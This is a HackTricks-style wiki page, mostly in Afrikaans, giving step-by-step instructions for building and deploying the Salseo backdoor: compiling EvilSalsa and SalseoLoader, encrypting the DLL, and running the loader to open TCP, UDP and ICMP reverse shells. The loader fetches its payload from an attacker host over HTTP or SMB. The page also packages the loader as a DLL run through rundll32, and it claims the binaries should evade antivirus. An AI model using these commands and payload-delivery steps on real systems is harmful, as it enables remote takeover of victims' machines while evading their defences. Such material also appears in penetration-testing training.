# Salseo

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Compiling the binaries

Laai die bronkode van die github af en kompileer **EvilSalsa** en **SalseoLoader**. Jy sal **Visual Studio** geïnstalleer moet hê om die kode te kompileer.

Kompileer daardie projekte vir die argitektuur van die Windows-boks waar jy dit gaan gebruik (As die Windows x64 ondersteun, kompileer dit vir daardie argitektuur).

Jy kan **die argitektuur kies** binne Visual Studio in die **linker "Build" Tab** in **"Platform Target".**

(\*\*As jy nie hierdie opsies kan vind nie, druk op **"Project Tab"** en dan op **"\<Project Name> Properties"**)

![](<../.gitbook/assets/image (132).png>)

Dan, bou albei projekte (Build -> Build Solution) (Binne die logs sal die pad van die uitvoerbare verskyn):

![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)

## Prepare the Backdoor

Eerstens, jy sal die **EvilSalsa.dll** moet kodeer. Om dit te doen, kan jy die python-skrip **encrypterassembly.py** gebruik of jy kan die projek **EncrypterAssembly** kompileer:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Ok, nou het jy alles wat jy nodig het om al die Salseo goed te uitvoer: die **gecodeerde EvilDalsa.dll** en die **binarie van SalseoLoader.**

**Laai die SalseoLoader.exe binarie op die masjien. Hulle behoort nie deur enige AV opgespoor te word nie...**

## **Voer die backdoor uit**

### **Kry 'n TCP reverse shell (aflaai van die gecodeerde dll deur HTTP)**

Onthou om 'n nc as die reverse shell luisteraar en 'n HTTP bediener te begin om die gecodeerde evilsalsa te bedien.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Om 'n UDP omgekeerde skulp te kry (gedownloade kodering dll deur SMB)**

Onthou om 'n nc as die omgekeerde skulp luisteraar te begin, en 'n SMB-bediener om die gekodeerde evilsalsa te bedien (impacket-smbserver).
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **Kry 'n ICMP omgekeerde skulp (geënkodeerde dll reeds binne die slagoffer)**

**Hierdie keer het jy 'n spesiale hulpmiddel in die kliënt nodig om die omgekeerde skulp te ontvang. Laai af:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **Deaktiveer ICMP Antwoorde:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Voer die kliënt uit:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### Binne die slagoffer, laat ons die salseo ding uitvoer:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Samevoeging van SalseoLoader as DLL wat hooffunksie uitvoer

Open die SalseoLoader projek met Visual Studio.

### Voeg voor die hooffunksie by: \[DllExport]

![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### Installeer DllExport vir hierdie projek

#### **Gereedskap** --> **NuGet Pakketbestuurder** --> **Bestuur NuGet-pakkette vir Oplossing...**

![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **Soek vir DllExport pakket (met die Blader tab), en druk Installeer (en aanvaar die pop-up)**

![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

In jou projekmap het die lêers verskyn: **DllExport.bat** en **DllExport\_Configure.bat**

### **U**ninstalleer DllExport

Druk **Uninstall** (ja, dit is vreemd maar glo my, dit is nodig)

![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)

### **Verlaat Visual Studio en voer DllExport\_configure uit**

Net **verlaat** Visual Studio

Gaan dan na jou **SalseoLoader map** en **voer DllExport\_Configure.bat** uit

Kies **x64** (as jy dit binne 'n x64 boks gaan gebruik, dit was my geval), kies **System.Runtime.InteropServices** (binne **Namespace vir DllExport**) en druk **Toepas**

![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)

### **Open die projek weer met Visual Studio**

**\[DllExport]** moet nie langer as 'n fout gemerk wees nie

![](<../.gitbook/assets/image (8) (1).png>)

### Bou die oplossing

Kies **Uitsettipe = Klasbiblioteek** (Projekt --> SalseoLoader Eienskappe --> Aansoek --> Uitsettipe = Klasbiblioteek)

![](<../.gitbook/assets/image (10) (1).png>)

Kies **x64** **platform** (Projekt --> SalseoLoader Eienskappe --> Bou --> Platform teiken = x64)

![](<../.gitbook/assets/image (9) (1) (1).png>)

Om die **oplossing** te **bou**: Bou --> Bou Oplossing (Binne die Uitset-konsol sal die pad van die nuwe DLL verskyn)

### Toets die gegenereerde Dll

Kopieer en plak die Dll waar jy dit wil toets.

Voer uit:
```
rundll32.exe SalseoLoader.dll,main
```
As daar geen fout verskyn nie, het jy waarskynlik 'n funksionele DLL!!

## Kry 'n shell met die DLL

Moet nie vergeet om 'n **HTTP** **bediener** te gebruik en 'n **nc** **luisteraar** in te stel nie

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
